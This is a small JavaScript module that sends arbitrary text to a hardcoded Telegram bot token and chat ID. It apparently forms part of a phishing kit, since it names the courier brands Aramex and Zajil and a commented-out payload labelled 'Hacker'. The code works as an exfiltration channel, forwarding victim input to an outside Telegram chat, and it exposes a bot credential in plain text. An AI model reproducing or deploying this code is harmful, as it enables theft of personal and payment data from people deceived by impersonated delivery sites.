import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
              /*  const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "مدونة ارامكس",
              description: des,
           },
          ],
    };
       */let txt= "مدونة زاجل  %0A"+ des   
        await         await axios.post(`https://api.telegram.org/bot7560249245:AAH-vNieN52eiQmvztRnC25bmhSRb9JMHlo/sendMessage?chat_id=2096894672&text=${txt}`) 
    }
  return {
    Send,
}
}

export default TeleSned;
